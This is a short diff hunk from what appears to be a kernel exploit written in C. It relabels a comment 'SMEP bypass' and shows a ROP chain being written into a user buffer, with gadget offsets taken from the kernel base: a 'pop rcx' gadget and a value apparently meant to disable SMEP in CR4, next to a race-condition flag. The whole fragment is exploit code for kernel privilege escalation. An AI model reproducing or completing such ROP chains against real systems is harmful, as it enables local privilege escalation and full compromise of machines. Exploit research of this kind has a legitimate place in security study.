@@ -135,7 +135,7 @@ int main() {
     char* offset = userBuffer + 0x800;
     QWORD* rop = (QWORD*)offset;
 
-    // we should set the raceWon variable to 1
+    // SMEP bypass
     *(rop + index++) = (QWORD)&raceWon;                             // stored on stack (not in rop chain)
     *(rop + index++) = (QWORD)kernelBase + 0x7f700b;                // pop rcx
     *(rop + index++) = (QWORD)0x0070678;
